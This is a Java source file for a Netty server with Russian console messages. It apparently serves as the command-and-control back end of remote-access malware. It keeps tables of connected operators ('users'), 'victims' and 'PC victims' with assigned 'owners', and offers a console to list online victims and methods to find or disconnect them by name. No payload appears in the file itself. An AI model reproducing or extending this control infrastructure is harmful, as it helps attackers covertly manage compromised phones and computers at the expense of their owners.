import db.DBManager;
import decoders.RequestDecoder;
import encoders.ResponseEncoder;
import io.netty.bootstrap.ServerBootstrap;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioServerSocketChannel;

import java.sql.SQLException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

public class NettyServer {
    private static NettyServer nettyServer;

    private int port;
    private DBManager dbManager;
    private Scanner in;
    private HashMap<ChannelId, User> users;
    private HashMap<ChannelId, Victim> victims;
    private HashMap<ChannelId, PCVictim> pcVictims;

    public NettyServer(int port) {
        this.port = port;
        this.users = new HashMap<>();
        this.victims = new HashMap<>();
        this.pcVictims = new HashMap<>();
    }

    public static NettyServer getInstance() {
        return nettyServer;
    }

    public static DBManager getDBManager() {
        return nettyServer.dbManager;
    }

    public void run() {
        newConnectionDB();
        startServer();
    }

    private void startServer() {
        EventLoopGroup bossGroup = null;
        EventLoopGroup workerGroup = null;
        try {
            System.out.println("Запускаем сервер...");
            bossGroup = new NioEventLoopGroup();
            workerGroup = new NioEventLoopGroup();

            ServerBootstrap bootstrap = new ServerBootstrap();
            bootstrap.group(bossGroup, workerGroup)
                    .channel(NioServerSocketChannel.class)
                    .childHandler(new ChannelInitializer<SocketChannel>() {
                        @Override
                        public void initChannel(SocketChannel ch) throws Exception {
                            ch.pipeline().addLast(
                                    new RequestDecoder(),
                                    new ResponseEncoder(),
                                    new RequestHandler(nettyServer));
                        }
                    }).option(ChannelOption.SO_BACKLOG, 128)
                    .childOption(ChannelOption.SO_KEEPALIVE, true);

            ChannelFuture f = bootstrap.bind(port).sync();
            System.out.println("Сервер успешно запущен! (порт: "+port+")");
            waitInputConsole();
            f.channel().closeFuture().sync();
        } catch (Exception e) {
            System.out.println("Ошибка запуска сервера! Занят порт: "+port);
        } finally {
            workerGroup.shutdownGracefully();
            bossGroup.shutdownGracefully();
            if (in != null) in.close();
        }
    }

    private void waitInputConsole() {
        in = new Scanner(System.in);
        String input;
        while ((input = in.nextLine()) != null) {
            try {
                String[] params = input.split(" ");
                if (params.length == 0) System.out.println("Неверный ввод! (см. [command] [params...])");
                else
                    receiveInputConsole(params);
            } catch (Exception e) {
                System.out.println("Запрос должен быть формата JSON!");
            }
        }
    }

    private void printVictims() {
        if (victims.size() == 0) {
            System.out.println("Нет жертв онлайн!");
            return;
        }
        System.out.println("Жертвы:");
        for (Map.Entry<ChannelId, Victim> entry : victims.entrySet()) {
            Victim victim = entry.getValue();
            System.out.println(victim.getName() + " owners: " + victim.getOwners() + " id: " + entry.getKey());
        }
    }

    private void printPCVictims() {
        if (pcVictims.size() == 0) {
            System.out.println("Нет ПК-жертв онлайн!");
            return;
        }
        System.out.println("ПК-Жертвы:");
        for (Map.Entry<ChannelId, PCVictim> entry : pcVictims.entrySet()) {
            PCVictim pcVictim = entry.getValue();
            System.out.println(pcVictim.getName() + " owners: " + pcVictim.getOwners() + " id: " + entry.getKey());
        }
    }

    private void printUsers() {
        if (users.size() == 0) {
            System.out.println("Нет пользователей онлайн!");
            return;
        }
        System.out.println("Пользователи:");
        for (Map.Entry<ChannelId, User> entry : users.entrySet()) {
            User user = entry.getValue();
            System.out.println(user.getLogin() + " victims: " + user.getVictims() + " id: " + entry.getKey());
        }
    }

    private void receiveInputConsole(String[] params) {
        switch (params[0]) {
            case "victims":
                printVictims();
                break;
            case "pcvictims":
                printPCVictims();
                break;
            case "users":
                printUsers();
                break;
            case "all":
                printUsers();
                printVictims();
                printPCVictims();
                break;
            default:
                System.out.println("Команда не респознана!");
        }
    }

    private void newConnectionDB() {
        try {
            System.out.println("Подключаемся к БД...");
            dbManager = new DBManager();
            System.out.println("Успешно подключились в БД!");
        } catch (SQLException e) {
            int mills = 5000;
            System.out.println("Ошибка подключения к БД! Ожидаем "+mills/1000+" сек...");
            try {
                Thread.sleep(5000);
                newConnectionDB();
            } catch (InterruptedException e1) {
                e1.printStackTrace();
            }
        }
    }

    public HashMap<ChannelId, User> getUsers() {
        return users;
    }

    public HashMap<ChannelId, Victim> getVictims() {
        return victims;
    }

    public HashMap<ChannelId, PCVictim> getPcVictims() {
        return pcVictims;
    }

    public Victim getVictimByName(String name) {
        for (Map.Entry<ChannelId, Victim> entry : victims.entrySet()) {
            if (entry.getValue().getName().equals(name)) return entry.getValue();
        }
        return null;
    }

    public void disconnectPCVictimsByName(String name) {
        for (Map.Entry<ChannelId, PCVictim> entry : pcVictims.entrySet()) {
            if (entry.getValue().getName().equals(name)) entry.getValue().disconnect();
        }
    }

    public PCVictim getPCVictimByName(String name) {
        for (Map.Entry<ChannelId, PCVictim> entry : pcVictims.entrySet()) {
            if (entry.getValue().getName().equals(name)) return entry.getValue();
        }
        return null;
    }

    public User getUserByName(String name) {
        for (Map.Entry<ChannelId, User> entry : users.entrySet()) {
            if (entry.getValue().getLogin().equals(name)) return entry.getValue();
        }
        return null;
    }

    public static void main(String[] args) {
        int port = args.length > 0? Integer.parseInt(args[0]) : 1121;
        nettyServer = new NettyServer(port);
        nettyServer.run();
    }

}
